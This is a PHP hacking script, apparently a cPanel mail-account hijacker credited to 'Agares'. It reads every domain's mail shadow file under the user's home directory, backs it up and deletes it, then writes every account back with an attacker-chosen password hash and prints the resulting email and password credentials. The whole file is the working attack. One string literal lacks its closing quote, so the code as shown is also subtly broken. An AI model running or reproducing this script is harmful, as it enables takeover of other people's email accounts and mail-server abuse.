<?php
// Coded By Agares Twitter.com/2gares
// https://societymoro.online
set_time_limit(0);

ini_set('max_execution_time',0);

ini_set('memory_limit',-1);

$ports=array(25, 587, 465, 110, 995, 143 , 993);

$primary_port='25';

$user=get_current_user();

$password='Agares;

$pwd = crypt($password,'$6$Agares$');

 $t = $_SERVER['SERVER_NAME'];

 $t = @str_replace("www.","",$t);

 

$dirs = glob('/home/'.$user.'/etc/*', GLOB_ONLYDIR);

foreach($dirs as $dir){

$ex = explode("/",$dir);

$site =  $ex[count($ex)-1];

@$passwd = file_get_contents('/home/'.$user.'/etc/'.$site.'/shadow');

$ex=explode("\r\n",$passwd);

@link('/home/'.$user.'/etc/'.$site.'/shadow','/home/'.$user.'/etc/'.$site.'/shadow.MrTEM0.bak');

@unlink('/home/'.$user.'/etc/'.$site.'/shadow');

foreach($ex as $ex){

$ex=explode(':',$ex);

$e= $ex[0];

if ($e){

$b=fopen('/home/'.$user.'/etc/'.$site.'/shadow','ab');fwrite($b,$e.':'.$pwd.':16249:::::'."\r\n");fclose($b);

echo '<tefa>'.$site.'|25|'.$e.'@'.$site.'|'.$password.'</tefa><br>';  "</center>";

}}

}

?>
